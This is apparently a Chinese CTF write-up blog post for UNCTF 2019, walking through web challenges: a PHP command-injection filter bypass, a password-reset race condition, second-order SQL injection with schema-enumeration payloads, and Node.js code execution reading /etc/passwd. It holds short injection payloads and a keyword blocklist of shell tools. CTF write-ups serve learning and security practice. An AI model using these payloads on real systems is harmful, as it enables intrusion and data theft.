categories:
- 比赛
tags:
- wp
- ctf
title: unctf2019
---
# unctf2019

## bypass

```php

<?php
    highlight_file(__FILE__);
    $a = $_GET['a'];
    $b = $_GET['b'];
 // try bypass it
    if (preg_match("/\'|\"|,|;|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $a))
        $a = "";
        $a ='"' . $a . '"';
    if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $b))
        $b = "";
        $b = '"' . $b . '"';
     $cmd = "file $a $b";
      str_replace(" ","","$cmd"); 
     system($cmd);
?>
```



用`a=\&b=\`来逃脱引号

用?来匹配,但是隐藏文件是无法显示的要自己在前面加一个.

`file "\" -f "  \"`

最后在` http://101.71.29.5:10054/.F1jh_/h3R3_1S_your_F1A9.txt `里找到flag

`unctf{86dfe85d7c5842c5c04adae104193ee1}`



## NSB RESET PASSWORD

题目说是重置密码,刚开始我想的是越权

后面搞了好久都不行。后面试着弄了一下发现一个验证码可以多次用.

我就猜有可能是条件竞争

先注册一个账号用收到的验证码重置，然后再用admin账号请求重置密码

然后直接跳到修改密码的界面,修改一下就出来了



 flag{175f3098f80735ddfdfbd4588f6b1082} 



## 帮赵总征婚

盲猜sql注入

转义:`',",\,#`

还给了我们一个phpinfo?????

我也想帮赵总征婚啊，可是我没机会

remember_me 是否可以注入?





## inject twice

题目是sql-lab的源码

二次注入点

```php
if (isset($_POST['submit']))
{
	
	
	# Validating the user input........
	$username= $_SESSION["username"];
	$curr_pass= mysql_real_escape_string($_POST['current_password']);
	$pass= mysql_real_escape_string($_POST['password']);
	$re_pass= mysql_real_escape_string($_POST['re_password']);
	
	if($pass==$re_pass)
	{	
		$sql = "UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' ";
		$res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');
		$row = mysql_affected_rows();
		echo '<font size="3" color="#FFFF00">';
		echo '<center>';
		if($row==1)
		{
			echo "Password successfully updated";
	
		}
		else
		{
			header('Location: failed.php');
			//echo 'You tried to be smart, Try harder!!!! :( ';
		}
	}
	else
	{
		echo '<font size="5" color="#FFFF00"><center>';
		echo "Make sure New Password and Retype Password fields have same value";
		header('refresh:2, url=index.php');
	}
}
?>
```



但是得到admin账号后,并没有得到flag,估计要把数据库给溜一圈。

黑名单:`or, `

注册一个`hello\`的账号,就可以用,currentpass来注入,但是环境炸了,我sleep了一下就奇奇怪怪了

//////////////???????????????????

currentpass=`/**/or/**/1-- a`

数据库名` or (SELECT substr(hex(group_concat(schema_name)),1,1) FROM information_schema.schemata)=char(54)-- a`

information_schema,metinfo,mysql,performance_schema,security,sys

表:

`GROUP_CONCAT(table_name) FROM information_schema.tables WHERE TABLE_SCHEMA=database()`

security:emails,fl4g,referers,uagents,users

列名

fl4g:f1ag

最后的flag` UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}`





## checkin 

又是一个vue应用

![image.png](http://ww1.sinaimg.cn/large/006pWR9agy1g8cz6r1f4pj30ep0d2wfe.jpg)

在代码中发现

/calc: 可以命令执行,但是却没有办法找到有效的利用方式

后端是node.js

version: v10.12.0 

cwd:/usr

/usr目录

 bin,games,include,lib,local,sbin,share,src 

res.end(require('fs').readFileSync('/etc/passwd').toString())

require('fs').readdirSync.('/etc/passwd').toString()

在根目录下找到flag

  flag{0e4d1980ef6f8a81428f83e8e1c6e22b} 

最后还是晚了一分钟

看来改天要看看nodejs的东东?

